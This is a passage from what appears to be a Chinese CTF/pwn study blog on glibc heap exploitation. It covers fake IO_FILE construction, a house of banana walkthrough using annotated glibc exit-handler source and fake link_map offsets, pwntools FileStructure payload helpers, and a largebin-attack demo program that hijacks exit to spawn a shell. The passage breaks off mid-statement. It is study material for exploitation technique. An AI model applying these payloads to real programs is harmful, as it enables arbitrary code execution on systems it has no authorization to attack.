class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>不是一种攻击IO_FILE的利用手段。程序通过exit退出时，会调用一个名叫 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<ul>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ul>
<p>gdb 常用的指令</p>
<ul>
<li>这是ld.so 文件中的一个地址，因此不能使用libc.sym获得地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure>


<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>。</p>
<ul>
<li>glibc 2.37 后的源码，对比之前的与那吗，发现主要的变化为 <code>_dl_call_fini(l);</code>，跟进函数发现除了输出debugging信息函数变了，其余都没变</li>
<li>link map 使用双向链表连接起来</li>
<li>nmaps 是 <code>maps[]</code> 中元素个数，也就是 <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>建议自己随便写个程序，将其中变量打印出来看看。这里加载下面的注释里</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">	  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">	  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  直到出现0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// 需要进入这个if线</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// 所以说不会超过4个</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// 过其中一个检查，i==nloaded,也就是全部的if线都要进入。</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">	  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// 进入这个函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>走到 <code>_dl_call_fini</code></p>
<ul>
<li>存在一个函数调用 <code>((fini_t)array[sz])()</code>，map为参数，也就是上面的 <code>GL(dl_ns)[ns]._ns_loaded</code> 和其 next，next-&gt;next…</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded 和 l_next 指针</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) 上一个指令地址</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">	<span class="comment">// 不管什么类型，最后调用的函数地址可以得到</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是函数调用能攻击一下就行，为了更容易的通过if的条件的，我们一般替换链表最后一个 link_map，也就是打第3个linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>这是部分的内容，只截取了我们需要的内容</li>
<li>伪造l_addr, fini_array-&gt;d_un.d_ptr 内容</li>
<li>DT_FINI_ARRAY 为 26，DT_FINI_ARRAYSZ 为 28</li>
<li>因为源码可能比较抽象，不如直接打印出来，这里只截取有用的部分</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">	type = struct &#123;</span><br><span class="line">	    Elf64_Sxword d_tag;</span><br><span class="line">	    union &#123;</span><br><span class="line">	        Elf64_Xword d_val;</span><br><span class="line">	        Elf64_Addr d_ptr;</span><br><span class="line">	    &#125; d_un;</span><br><span class="line">	&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure>


<p>伪造，堆地址 A</p>
<ul>
<li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 内容放着堆地址 <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called 不为0，数字随意，根据版本而异。 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>。我测的是0x312</li>
<li><code>map.l_info[26]</code> 不为 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 控制循环次数，一般写成1就行</li>
<li>控制函数执行流 <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>。也就是 <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>偏移是0x110。那么28是0x120</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_called，但是测试后是一个magic num，需要将其余结构体的linkmap 的 l_init_called 打印出来赋值</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，需要设置 l_next 位置为0才行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的就比较固定了</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 是 d_un 结构体指针</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// 后面加的那个东西</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell 执行shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]。由上可知，为0，同时为 26 的 d_tag 成员</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] 的 d_un 指针。 sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>其实看pwntools文档可以看出其中对 <code>IO_FILE</code> 也存在很多可以利用的点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>IO_FILE 结构体</li>
</ol>
<ul>
<li><code>_wide_data</code> 就是我们现在常利用的点。</li>
<li>改变成员也只是需要 <code>fs.flags = 0x123</code> 直接赋值</li>
<li>两个 unknown 变量填充结构体</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>house of orange</li>
</ol>
<ul>
<li>io_list_all 地址</li>
<li>伪造的 vtable 地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>从 addr 泄露 size 大小的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>packing，因为我们需要伪造file结构体，因此我们可以使用如下函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据 context.arch打包， 类似 p32，p64 函数</span></span><br><span class="line">flat([</span><br><span class="line">	  con1,</span><br><span class="line">	  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, 类似于 cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line">	<span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相对偏移</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时可以指定填充内容 和 总长度，因为我们伪造结构体需要满足一定条件</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用法和flat(&#123;&#125;) 一样 官方文档是 alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>最好手动调试一下 largebin attack 和 house_of_banana。</p>
<h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p>参考一下 <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析</a>这一篇文章的demo</p>
<ul>
<li>注意改rtld相关指针和libc的偏移大小</li>
</ul>
<p>makefile</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f $(TARGET) </span><br></pre></td></tr></table></figure>

<p>house of banana</p>
<ul>
<li>伪造结构体 l_next 为 0</li>
<li>l_init_called 一个比较神奇的数字，具体的libc打印</li>
<li>ubuntu 22.04 LTS 测试一下，在gdb 下可以执行一个命令就会崩溃。</li>
<li>高版本libc 没有patch进行测试，但是根据源码可行（理论上）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123; </span><br><span class="line">  <span class="built_in">execve</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">get_libc_base</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> to;</span><br><span class="line">  <span class="type">uint64_t</span> from;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">  FILE *file;</span><br><span class="line">  file = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file)) &#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%s\n&quot;, buf);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;libc.so.6&quot;</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">      <span class="built_in">fclose</span>(file);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;libc =&gt; %#lx-%#lx\n&quot;</span>, from, to);</span><br><span class="line">      <span class="comment">// getchar();</span></span><br><span class="line">      <span class="keyword">return</span> from;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> libc_base = <span class="built_in">get_libc_base</span>();</span><br><span class="line">  <span class="type">uint64_t</span> rtld_global = libc_base + <span class="number">0x3fd040</span>;</span><br><span class="line">  <span class="comment">// &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">  <span class="type">uint64_t</span> *next_node = (<span class="type">uint64_t</span> *)(rtld_global - <span class="number">0x41ec8</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  <span class="comment">// force p1 insert in to the largebin</span></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node 